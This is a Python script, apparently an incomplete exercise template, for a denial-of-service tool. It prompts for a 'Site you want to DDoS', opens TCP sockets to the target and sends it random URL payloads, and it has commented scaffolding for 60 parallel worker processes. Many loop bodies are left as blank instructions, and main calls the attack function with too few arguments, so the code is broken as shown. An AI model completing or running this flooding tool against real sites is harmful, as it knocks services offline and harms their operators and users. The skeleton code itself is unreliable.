
from helpers import get_random_url
import json
import socket
import multiprocessing

def ddos_attack(ip_address, port, number_of_sockets):
    try:
        # Create an empty list sockets
        

        # Loop through 0 to number_of_sockets
        

            # Indent following two lines
        ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ddos.connect((ip_address, port))

            # Append the ddos socket inside the sockets list
        

        # Loop through each ddos socket in sockets list
        
            # Indent following five lines
        random_url = get_random_url()
        message = json.dumps(random_url).encode()
        ddos.send(message)
        ddos.sendto(message, (ip_address, port))
        ddos.send(message)

        # Loop thought each conn_close in socket

            # Add try block to try and close the connection conn_close 
            
        ddos.close()
            # Except pass
            
            
    except Exception as err:
        print(err)

def monitor(workers):
    while len(workers) > 10:
        try:
            for worker in workers:
                if worker is not None and worker.is_alive():
                    worker.join(1.0)
                    print(f"Woker Number - {worker.name} Joined!")
                else:
                    workers.remove(worker)
        except (KeyboardInterrupt, SystemExit):
            print("CTRL+C received. Killing all workers")
            for worker in workers:
                try:
                    print(f"Killing worker {worker.name}")
                    worker.stop()
                except Exception:
                    pass  

def main():
    host = input("Site you want to DDoS:")
    port = int(input("Enter port number:"))

    ip_address = socket.gethostbyname(host)

    # Create variable number_of_sockets and set its value to 120
    

    # Default number of workers
    number_of_workers = 60

    print("|| DDoS Loaded ||")

    # Pass number of sockets, call it only when ddos to be performed without workers
    ddos_attack(ip_address, port)

    # Uncomment following to include workers
    # while True:
    #     try:
    #         workers = []
    #         # Run for loop from 0 to number of workers
            
    #             # Create a worker pass ddos_attack as target and (ip_address, port, number_of_sockets) as args
                
                
    #             # Add worker to workers
                
    #             # Call start() method using worker
                

    #         monitor(workers)

    #     except Exception as err:
    #         print("| Connection Failed |")


if __name__ == "__main__":
    main()
